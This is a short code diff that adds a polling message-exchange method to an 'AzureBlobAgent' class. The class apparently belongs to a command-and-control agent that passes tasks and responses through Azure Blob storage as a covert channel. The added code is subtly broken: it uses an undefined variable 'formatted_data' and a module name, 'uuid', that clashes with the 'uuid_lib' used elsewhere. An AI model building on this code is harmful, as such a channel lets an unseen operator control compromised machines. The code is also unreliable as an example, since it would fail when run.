@@ -170,6 +170,17 @@ class AzureBlobAgent:
         blob_name = f"ats/message.blob"
         return self.put_blob(blob_name, encoded)
 
+    def postMessageAndRetrieveResponseBlob(self, data):
+        message_id = uuid.uuid4()
+        self.put_blob(f"ats/{message_id}.blob", formatted_data)
+        response = b""
+        while response == b"":
+            sleep(self.get_sleep_time())
+            response = self.get_blob(f"sta/{message_id}.blob")
+            print(f"[*] checking for sta/{message_id}.blob: {response}")
+        self.delete_blob(f"sta/{message_id}.blob")
+        return self.formatResponse(base64.b64decode(response))
+
     def execute_task(self, task: dict) -> dict:
         """Execute a task and return response"""
         task_id = task.get("id", str(uuid_lib.uuid4()))
